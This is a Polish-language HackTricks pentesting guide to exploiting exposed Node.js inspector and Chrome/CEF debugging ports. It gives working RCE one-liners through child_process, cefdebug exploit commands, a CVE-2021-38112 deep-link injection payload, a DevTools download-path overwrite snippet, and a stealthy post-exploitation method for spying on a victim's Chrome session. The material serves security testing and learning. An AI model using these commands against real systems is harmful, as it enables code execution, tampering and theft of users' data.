# Wykorzystanie debugera Node inspector/CEF

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[Z dokumentacji](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Gdy uruchomiony jest proces Node.js z przełącznikiem `--inspect`, nasłuchuje on na klienta debugującego. **Domyślnie** nasłuchuje na adresie hosta i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalne** **UUID**.

Klienci debugera muszą znać i określić adres hosta, port i UUID, aby się połączyć. Pełny adres URL będzie wyglądał na coś takiego: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Ponieważ **debuger ma pełny dostęp do środowiska wykonawczego Node.js**, złośliwy aktor, który jest w stanie połączyć się z tym portem, może wykonać dowolny kod w imieniu procesu Node.js (**potencjalne eskalowanie uprawnień**).
{% endhint %}

Istnieje kilka sposobów uruchomienia debugera:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kiedy uruchomisz proces poddany inspekcji, pojawi się coś takiego:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesy oparte na **CEF** (**Chromium Embedded Framework**), takie jak, muszą używać parametru: `--remote-debugging-port=9222`, aby otworzyć **debugger** (ochrona przed SSRF pozostaje bardzo podobna). Jednakże, zamiast udostępniać sesję **debugowania** **NodeJS**, będą komunikować się z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), jest to interfejs do kontrolowania przeglądarki, ale nie ma bezpośredniego RCE.

Gdy uruchomisz przeglądarkę w trybie debugowania, pojawi się coś takiego:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Przeglądarki, WebSockety i polityka same-origin <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce internetowej mogą wykonywać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne do **uzyskania unikalnego identyfikatora sesji debugera**. **Polityka same-origin** **uniemożliwia** stronom internetowym wykonanie **tego połączenia HTTP**. W celu dodatkowego zabezpieczenia przed [**atakami DNS rebinding**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js sprawdza, czy nagłówki **'Host'** dla połączenia określają dokładnie **adres IP** lub **`localhost`** lub **`localhost6`**.

{% hint style="info" %}
Te **środki bezpieczeństwa uniemożliwiają wykorzystanie inspektora** do uruchamiania kodu **poprzez wysłanie żądania HTTP** (co mogłoby być możliwe w przypadku wykorzystania podatności SSRF).
{% endhint %}

### Uruchamianie inspektora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu Node.js, aby **uruchomić inspektora** na domyślnym porcie. Należy jednak zauważyć, że wymaga to odpowiednich uprawnień, więc może to dać ci **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednie podniesienie uprawnień.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Jest to przydatne w kontenerach, ponieważ **zamknięcie procesu i uruchomienie nowego** z opcją `--inspect` nie jest **opcją**, ponieważ **kontener** zostanie **zabity** wraz z procesem.
{% endhint %}

### Połączenie z inspektorem/debuggerem

Aby połączyć się z przeglądarką opartą na Chromium, można użyć adresów URL `chrome://inspect` lub `edge://inspect` dla przeglądarki Chrome lub Edge. Klikając przycisk Konfiguruj, należy upewnić się, że **adres hosta i port** są poprawnie wymienione. Obrazek pokazuje przykład zdalnego wykonania kodu (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

Za pomocą **wiersza poleceń** można połączyć się z debuggerem/inspektorem za pomocą:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znalezienie inspektorów** działających lokalnie i **wstrzyknięcie kodu** do nich.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Należy zauważyć, że **exploity RCE NodeJS nie zadziałają**, jeśli jesteś połączony z przeglądarką za pomocą [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć interesujące rzeczy, które można z nim zrobić).
{% endhint %}

## RCE w NodeJS Debugger/Inspector

{% hint style="info" %}
Jeśli tu trafiłeś, szukając sposobu na uzyskanie [**RCE z XSS w Electron, sprawdź tę stronę.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Niektóre powszechne sposoby uzyskania **RCE**, gdy można **połączyć się** z **inspektorem** Node, to używanie czegoś takiego jak (wygląda na to, że to **nie zadziała w połączeniu z protokołem Chrome DevTools**):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools Protocol Payloads

Możesz sprawdzić API tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
W tej sekcji po prostu wymienię interesujące rzeczy, które ludzie wykorzystali do ataku na ten protokół.

### Wstrzykiwanie parametrów za pomocą głębokich linków

W przypadku [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino Security odkrył, że aplikacja oparta na CEF **zarejestrowała niestandardowy adres URI** w systemie (workspaces://), który otrzymywał pełny adres URI, a następnie **uruchamiał aplikację opartą na CEF** z konfiguracją częściowo konstruowaną na podstawie tego adresu URI.

Odkryto, że parametry adresu URI były dekodowane z użyciem URL i używane do uruchamiania podstawowej aplikacji CEF, co umożliwia użytkownikowi **wstrzyknięcie** flagi **`--gpu-launcher`** w **linii poleceń** i wykonanie dowolnych czynności.

Więc, payload tak jak:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Wykonaj calc.exe.

### Nadpisywanie plików

Zmień folder, w którym **zapisywane są pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Wykorzystanie Webdriver RCE i eksfiltracja

Zgodnie z tym postem: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), możliwe jest uzyskanie RCE i eksfiltracja wewnętrznych stron z theriver.

### Po eksploatacji

W rzeczywistym środowisku i **po skompromitowaniu** komputera użytkownika korzystającego z przeglądarki opartej na Chrome/Chromium, można uruchomić proces Chrome z aktywowanym debugowaniem i przekierować port debugowania, aby uzyskać do niego dostęp. W ten sposób będzie można **inspirować wszystko, co ofiara robi w Chrome i kraść wrażliwe informacje**.

Sposobem na działanie w ukryciu jest **zakończenie każdego procesu Chrome** i następnie wywołanie czegoś w stylu
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Odwołania

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
